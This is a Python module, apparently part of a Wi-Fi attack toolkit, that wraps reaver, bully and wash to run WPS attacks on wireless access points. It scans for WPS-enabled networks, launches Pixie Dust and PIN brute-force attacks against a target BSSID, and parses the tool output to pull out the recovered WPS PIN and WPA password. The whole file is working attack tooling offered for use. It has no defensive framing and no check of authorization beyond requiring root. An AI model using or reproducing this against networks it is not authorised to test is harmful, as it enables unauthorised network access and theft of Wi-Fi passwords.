"""Reaver/bully wrapper for WPS PIN attacks.

Provides a unified API for WPS Pixie Dust, PIN brute-force,
and associated operations via reaver and bully.
"""

from __future__ import annotations

import logging
import os
import re
import subprocess
import time
from dataclasses import dataclass
from typing import Any, Optional

from wifi_aio.exceptions import (
    WPSError,
    WiFiPermissionError,
    WiFiTimeoutError,
)

logger = logging.getLogger(__name__)


@dataclass
class WPSResult:
    """Result of a WPS attack.

    Attributes:
        success: Whether the WPS PIN / password was recovered.
        pin: The recovered WPS PIN.
        wpa_password: The WPA password obtained via WPS.
        bssid: Target BSSID.
        attack_type: Type of attack performed.
        time_elapsed: Seconds elapsed.
        output: Raw tool output.
    """

    success: bool = False
    pin: str = ""
    wpa_password: str = ""
    bssid: str = ""
    attack_type: str = ""
    time_elapsed: float = 0.0
    output: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "success": self.success,
            "pin": self.pin,
            "wpa_password": self.wpa_password,
            "bssid": self.bssid,
            "attack_type": self.attack_type,
            "time_elapsed": self.time_elapsed,
        }


class ReaverWrapper:
    """Run reaver/bully for WPS attacks.

    Supports:
      - Pixie Dust attack (reaver/bully)
      - PIN brute-force attack (reaver)
      - WPS scan with wash

    Example::

        reaver = ReaverWrapper(interface="wlan0mon")
        result = reaver.pixie_dust("AA:BB:CC:DD:EE:FF")
        if result.success:
            print(f"PIN: {result.pin}, Password: {result.wpa_password}")
    """

    def __init__(
        self,
        interface: str = "wlan0mon",
        timeout: int = 300,
        reaver_path: str = "reaver",
        bully_path: str = "bully",
        wash_path: str = "wash",
    ) -> None:
        self.interface = interface
        self.timeout = timeout
        self.reaver_path = reaver_path
        self.bully_path = bully_path
        self.wash_path = wash_path
        self._process: Optional[subprocess.Popen] = None
        self._running = False

    def _check_root(self) -> None:
        if os.geteuid() != 0:
            raise WiFiPermissionError("WPS attacks require root privileges")

    # ── Scan ───────────────────────────────────────────────────────────

    def scan_wps(self, channel: int = 0, duration: int = 30) -> list[dict[str, Any]]:
        """Scan for WPS-enabled access points using wash.

        Args:
            channel: Channel to scan (0 = all).
            duration: Scan duration in seconds.

        Returns:
            List of dicts with WPS AP information.
        """
        self._check_root()

        cmd = [self.wash_path, "-i", self.interface]
        if channel > 0:
            cmd.extend(["-c", str(channel)])

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=duration + 10,
            )
            output = result.stdout + result.stderr
            return self._parse_wash_output(output)
        except FileNotFoundError:
            raise WPSError("wash not found. Install reaver package.")
        except subprocess.TimeoutExpired:
            raise WiFiTimeoutError("wash scan timed out")

    @staticmethod
    def _parse_wash_output(output: str) -> list[dict[str, Any]]:
        """Parse wash output into structured AP data."""
        aps: list[dict[str, Any]] = []
        for line in output.splitlines():
            line = line.strip()
            if not line or line.startswith("-") or line.startswith("BSSID"):
                continue
            parts = line.split()
            if len(parts) >= 6:
                aps.append({
                    "bssid": parts[0],
                    "channel": parts[1] if len(parts) > 1 else "",
                    "signal_dbm": parts[2] if len(parts) > 2 else "",
                    "wps_locked": "Lckd" in line or "Locked" in line,
                    "ssid": " ".join(parts[5:]) if len(parts) > 5 else "",
                })
        return aps

    # ── Pixie Dust ─────────────────────────────────────────────────────

    def pixie_dust(
        self,
        bssid: str,
        channel: Optional[int] = None,
        timeout: Optional[int] = None,
    ) -> WPSResult:
        """Attempt a WPS Pixie Dust attack using reaver.

        Args:
            bssid: Target AP BSSID.
            channel: Target channel (auto-detected if not provided).
            timeout: Maximum seconds (default: instance timeout).

        Returns:
            WPSResult with the outcome.
        """
        self._check_root()
        effective_timeout = timeout or self.timeout

        cmd = [
            self.reaver_path,
            "-i", self.interface,
            "-b", bssid,
            "-K", "1",  # Pixie Dust
            "-vv",
        ]
        if channel:
            cmd.extend(["-c", str(channel)])

        start = time.time()
        self._running = True

        try:
            self._process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            )
            stdout, stderr = self._process.communicate(timeout=effective_timeout)
            output = stdout + stderr

            result = self._parse_reaver_output(output, bssid, "pixie_dust")
            result.time_elapsed = time.time() - start
            return result

        except FileNotFoundError:
            # Fall back to bully
            return self._pixie_dust_bully(bssid, channel, effective_timeout)
        except subprocess.TimeoutExpired:
            self._process.kill()
            self._process.communicate()
            raise WiFiTimeoutError("Reaver Pixie Dust attack timed out")
        finally:
            self._running = False
            self._process = None

    def _pixie_dust_bully(
        self,
        bssid: str,
        channel: Optional[int] = None,
        timeout: int = 300,
    ) -> WPSResult:
        """Attempt Pixie Dust attack using bully."""
        self._check_root()

        cmd = [
            self.bully_path,
            self.interface,
            "-b", bssid,
            "-d",  # Pixie Dust
            "-v", "4",
        ]
        if channel:
            cmd.extend(["-c", str(channel)])

        start = time.time()
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout,
            )
            output = result.stdout + result.stderr
            parsed = self._parse_bully_output(output, bssid, "pixie_dust")
            parsed.time_elapsed = time.time() - start
            return parsed
        except FileNotFoundError:
            raise WPSError("Neither reaver nor bully found. Install one.")
        except subprocess.TimeoutExpired:
            raise WiFiTimeoutError("Bully Pixie Dust attack timed out")

    # ── PIN brute-force ────────────────────────────────────────────────

    def pin_bruteforce(
        self,
        bssid: str,
        channel: Optional[int] = None,
        timeout: Optional[int] = None,
        delay: int = 1,
        max_attempts: int = 0,
    ) -> WPSResult:
        """Run WPS PIN brute-force attack via reaver.

        Args:
            bssid: Target AP BSSID.
            channel: Target channel.
            timeout: Maximum seconds.
            delay: Delay between attempts.
            max_attempts: Maximum PIN attempts (0 = unlimited).

        Returns:
            WPSResult with the outcome.
        """
        self._check_root()
        effective_timeout = timeout or self.timeout

        cmd = [
            self.reaver_path,
            "-i", self.interface,
            "-b", bssid,
            "-vv",
            "-d", str(delay),
        ]
        if channel:
            cmd.extend(["-c", str(channel)])
        if max_attempts > 0:
            cmd.extend(["-N", str(max_attempts)])

        start = time.time()
        self._running = True

        try:
            self._process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            )
            stdout, stderr = self._process.communicate(timeout=effective_timeout)
            output = stdout + stderr

            result = self._parse_reaver_output(output, bssid, "pin_bruteforce")
            result.time_elapsed = time.time() - start
            return result

        except FileNotFoundError:
            raise WPSError("reaver not found. Install reaver package.")
        except subprocess.TimeoutExpired:
            self._process.kill()
            self._process.communicate()
            raise WiFiTimeoutError("Reaver PIN attack timed out")
        finally:
            self._running = False
            self._process = None

    # ── Output parsing ─────────────────────────────────────────────────

    @staticmethod
    def _parse_reaver_output(
        output: str, bssid: str, attack_type: str,
    ) -> WPSResult:
        """Parse reaver output for PIN and password."""
        result = WPSResult(bssid=bssid, attack_type=attack_type, output=output)

        # WPS PIN
        pin_match = re.search(r'WPS PIN:\s*[\'"]?(\d{8})[\'"]?', output)
        if pin_match:
            result.pin = pin_match.group(1)

        # WPA password
        pw_match = re.search(r'WPA PSK:\s*[\'"]?(.+?)[\'"]?\s*$', output, re.MULTILINE)
        if pw_match:
            result.wpa_password = pw_match.group(1).strip()

        if result.pin or result.wpa_password:
            result.success = True

        # Check for lockout
        if "WPS lockout" in output or "locked" in output.lower():
            logger.warning("WPS lockout detected for %s", bssid)

        return result

    @staticmethod
    def _parse_bully_output(
        output: str, bssid: str, attack_type: str,
    ) -> WPSResult:
        """Parse bully output for PIN and password."""
        result = WPSResult(bssid=bssid, attack_type=attack_type, output=output)

        pin_match = re.search(r"PIN:\s*(\d{8})", output)
        if pin_match:
            result.pin = pin_match.group(1)

        pw_match = re.search(r"PSK:\s*(.+)", output)
        if pw_match:
            result.wpa_password = pw_match.group(1).strip()

        if result.pin or result.wpa_password:
            result.success = True

        return result

    # ── Lifecycle ──────────────────────────────────────────────────────

    def stop(self) -> None:
        """Stop the running WPS attack."""
        self._running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()
                self._process.wait()
        self._process = None

    def is_running(self) -> bool:
        return self._running

    def __repr__(self) -> str:
        return f"ReaverWrapper(interface={self.interface!r})"
